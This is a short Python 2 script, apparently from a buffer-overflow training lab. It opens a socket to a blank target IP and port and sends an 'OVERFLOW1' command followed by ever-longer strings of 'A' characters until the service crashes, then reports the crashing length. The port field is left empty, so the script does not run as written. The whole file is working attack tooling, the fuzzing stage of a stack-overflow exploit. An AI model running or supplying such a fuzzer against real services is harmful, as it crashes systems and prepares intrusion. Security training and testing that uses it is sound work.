#!/usr/bin/python
import sys,socket
from time import sleep



#Here you have to enter ip and port on which program is run also change command name in messsage

ip=""			#enter ip
port=
message = "OVERFLOW1 "
buffer = "A"*100
while True:
	try:
		s = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
		s.connect((ip,port))
		print("Fuzzing with %s bytes" % len(buffer))
		s.send(message + buffer)
		s.close()
		sleep(1)
		buffer += "A"*100			
	except:
		print "Fuzzing crashed at %s bytes " % str(len(buffer))
		sys.exit()

